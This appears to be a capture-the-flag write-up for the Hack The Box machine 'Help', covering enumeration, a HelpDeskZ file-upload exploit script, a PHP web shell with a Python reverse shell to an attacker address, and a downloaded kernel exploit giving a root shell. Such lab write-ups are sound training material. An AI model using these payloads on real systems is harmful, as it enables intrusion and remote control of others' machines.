---
layout: post
category: writeup
---

## Machine Info

- Name: Help
- Description: Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

Visiting port 80 redirects to `help.htb` so now I will add it to my `/etc/hosts`. 

Upon visiting the page, I see the default apache2. It is time to dirsearch


```bash
HTB dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://help.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/help.htb/-_24-01-22_12-49-51.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-22_12-49-51.log

Target: http://help.htb/

[12:49:52] Starting: 
[12:49:53] 301 -  306B  - /support  ->  http://help.htb/support/
[12:49:53] 200 -    4KB - /support/
[12:49:54] 403 -  289B  - /icons/
[12:49:58] 200 -   11KB - /index.html
[12:50:03] 301 -  309B  - /javascript  ->  http://help.htb/javascript/
[12:50:03] 403 -  294B  - /javascript/
```

This finds that /support/ exists, and that leads to a HelpDeskZ instance:

![](assets/images/2024-01-20-help-writeup-image-1.png)

From there I try to enumerate the service version, however I found no luck in this.


### Port 3000

Taking a look at this I find a graphql instance with the following string:

![](assets/images/2024-01-20-help-writeup-image-2.png)

So at this point I attempt to enumerate the instance:

![](assets/images/2024-01-20-help-writeup-image-3.png)

I can see that username and password exist in the Use field, so I'll attempt to extract those.

![](assets/images/2024-01-20-help-writeup-image-4.png)

I get a username and a password, so from here I will crack the hash:

![](assets/images/2024-01-20-help-writeup-image-5.png)

I see that I have a few authenticated exploits:

![](assets/images/2024-01-20-help-writeup-image-6.png)

So I will attempt to exploit them now with my new credentials:

1. Search and download available exploits:
      ```console
      searchsploit helpdeskz
      # HelpDeskZ 1.0.2 - Arbitrary File Upload                                        | exploits/php/webapps/40300.py
      # HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download | exploits/php/webapps/41200.py

      searchsploit -m exploits/php/webapps/40300.py
      #   Exploit: HelpDeskZ 1.0.2 - Arbitrary File Upload
      #       URL: https://www.exploit-db.com/exploits/40300
      #      Path: /usr/share/exploitdb/exploits/php/webapps/40300.py
      # File Type: troff or preprocessor input, ASCII text, with CRLF line terminators
      ```
      - __*40300.py*__
        ```py
        ...
        
        import hashlib
        import time
        import sys
        import requests

        print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

        if len(sys.argv) < 3:
            print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
            sys.exit(1)

        helpdeskzBaseUrl = sys.argv[1]
        fileName = sys.argv[2]

        currentTime = int(time.time())

        for x in range(0, 300):
            plaintext = fileName + str(currentTime - x)
            md5hash = hashlib.md5(plaintext).hexdigest()

            url = helpdeskzBaseUrl+md5hash+'.php'
            response = requests.head(url)
            if response.status_code == 200:
                print "found!"
                print url
                sys.exit(0)

        print "Sorry, I did not find anything"
        ```
      __NOTE(S)__:
      - It searches for your uploaded file.
      - A UNIX timestamp up to five minutes ago is checked.

   2. Find the ticketing service's upload directory:
      ```bash
      gobuster -u http://10.10.10.121/support -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
      # /images (Status: 301)
      # /index.php (Status: 200)
      # /uploads (Status: 301)
      # /css (Status: 301)
      # /includes (Status: 301)
      # /js (Status: 301)

      gobuster -u http://10.10.10.121/support/uploads -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
      # /index.php (Status: 302)
      # /articles (Status: 301)
      # /tickets (Status: 301)
      ```
   3. Exploit HelpDeskZ's ticketing service:
      1. Fill-up all the required fields
      2. Attach payload (__*shell.php*__):
         ```PHP
         <?php

           echo system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.12.99\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");

         ?>
         ```
      3. Enter CAPTCHA
      4. Click "Submit"
      5. Run the python exploit (__*40300.py*__):
         ```console
         python ./40300.py http://10.10.10.121/support/uploads/tickets/ shell.php
         # Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
         # found!
         # http://10.10.10.121/support/uploads/tickets/b2c187c5977426db2acf2b5195e31687.php
         ```
   4. Set-up the reverse shell:
      - Local terminal:
        ```console
        nc -lvp 4444    
        ```
      - Another local terminal: 
        ```console
        curl http://10.10.10.121/support/uploads/tickets/b2c187c5977426db2acf2b5195e31687.php
        ```
      - While inside the reverse shell:
        ```console
        python -c 'import pty; pty.spawn("/bin/bash")'

        id
        # uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)

        cd ~
        cat user.txt
        # bb8a7b36bdce0c61ccebaa173ef946af
        ```


## Privilege Escalation

Doing the basic enum for root, I find a vulnerable kernel version, naturally, knowing this machine is old I try to find a real exploit mayeb the intended way, but I believe at this point that kernel exploit is the intended way.

```console
help@help:/tmp$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
help@help:/tmp$ wget http://10.10.14.14/44298.c
--2024-01-22 10:59:39--  http://10.10.14.14/44298.c
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6021 (5.9K) [text/x-csrc]
Saving to: ‘44298.c’

44298.c             100%[===================>]   5.88K  --.-KB/s    in 0.003s  

2024-01-22 10:59:40 (1.99 MB/s) - ‘44298.c’ saved [6021/6021]
help@help:/tmp$ gcc -o exp 44298.c 
help@help:/tmp$ ./exp 
task_struct = ffff88001d33aa80
uidptr = ffff88003db4d004
spawning root shell
root@help:/tmp# whoami
root
root@help:/tmp# cd /root
root@help:/root# ls
root.txt  snap
root@help:/root# cat root.txt 
1c6ffdc113c1bc11dd8ae8405e197107
root@help:/root#
```

gg
## Beyond Root

Generally speaking, the helpdesk instance is vulnerable to code execution. The graphql instance woulda likeliy worked with the SQLi on the webpage but it isn't actually needed. Hardening the graphql instance and actually keeping it on localhost would be effective. 

Next I would like to update the local machine to latest ubuntu to keep it safe otherwise its good!

best,
gerbsec